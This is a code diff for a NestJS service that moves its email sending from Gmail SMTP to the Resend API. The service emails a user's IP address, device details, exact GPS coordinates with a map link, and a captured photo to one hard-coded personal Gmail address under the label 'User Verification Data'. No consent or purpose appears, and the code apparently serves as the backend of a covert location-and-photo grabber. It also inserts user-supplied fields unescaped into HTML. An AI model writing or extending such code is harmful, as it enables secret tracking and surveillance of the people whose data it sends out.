@@ -1,47 +1,45 @@
-import * as nodemailer from 'nodemailer';
 import { Injectable } from '@nestjs/common';
+import { Resend } from 'resend';
 
 @Injectable()
 export class CollectService {
+  private resend = new Resend(process.env.RESEND_API_KEY);
+
   async sendEmail(data: any) {
     const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465,
-      secure: true,
-      auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS,
-      },
-    });
+    // image ko base64 me convert (Resend ke liye safe)
+    const photoBase64 = data.photo?.buffer
+      ? data.photo.buffer.toString('base64')
+      : null;
 
-    await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to: "manishkumr101k@gmail.com",
+    await this.resend.emails.send({
+      from: 'onboarding@resend.dev', // default verified sender
+      to: ['manishkumr101k@gmail.com'],
       subject: '📸 User Verification Data',
-      text: `
-IP Address: ${data.ip}
+      html: `
+        <h2>User Verification</h2>
 
-Device Info:
-${data.deviceInfo}
+        <p><b>IP Address:</b> ${data.ip}</p>
 
-GPS Location:
-Latitude: ${data.latitude}
-Longitude: ${data.longitude}
+        <p><b>Device Info:</b><br/>${data.deviceInfo}</p>
 
-Google Maps Link:
-${mapLink}
+        <p><b>GPS Location:</b><br/>
+        Latitude: ${data.latitude}<br/>
+        Longitude: ${data.longitude}</p>
 
-Time:
-${new Date().toLocaleString()}
+        <p><b>Google Maps:</b>
+        <a href="${mapLink}" target="_blank">Open Location</a></p>
+
+        ${
+          photoBase64
+            ? `<p><b>Captured Photo:</b><br/>
+               <img src="data:image/jpeg;base64,${photoBase64}" width="300"/></p>`
+            : ''
+        }
+
+        <p><b>Time:</b> ${new Date().toLocaleString()}</p>
       `,
-      attachments: [
-        {
-          filename: 'photo.jpg',
-          content: data.photo.buffer,
-        },
-      ],
     });
   }
 }
